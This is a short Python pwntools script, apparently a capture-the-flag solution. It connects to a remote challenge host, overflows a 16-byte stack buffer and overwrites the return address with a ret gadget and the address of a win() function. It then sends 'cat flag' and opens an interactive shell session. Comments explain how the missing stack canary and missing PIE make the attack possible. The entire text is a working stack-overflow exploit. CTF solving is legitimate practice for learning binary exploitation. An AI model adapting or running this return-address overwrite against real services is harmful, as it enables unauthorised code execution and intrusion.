from pwn import *

# From checksec:
# Stack:      No Canary found  =>  buffer overflow vulnerability is present
# PIE:        No PIE (0x400000)  =>  addresses are static and can be used directly in the exploit (e.g., win() function address)

conn = remote("offsec.m0lecon.it", 13577)

OFFSET_TO_RIP = 16 + 8    # 16 bytes for the buffer + 8 bytes for the saved RBP
win_addr = 0x4011fb
ret_gadget = 0x40101a

# NOTE: in this case, there is NOT any canary value on the stack, so it is sufficient to overwrite the RIP
#       with the address of the win() function
conn.recvuntil(b"whisper:\n")   # beware to include "\n" because of puts()
payload = flat(
    b"A" * OFFSET_TO_RIP,
    p64(ret_gadget),    # align stack to avoid issues with the next instruction
    p64(win_addr)
)

conn.sendline(payload)

conn.sendline(b"cat flag")

conn.interactive()
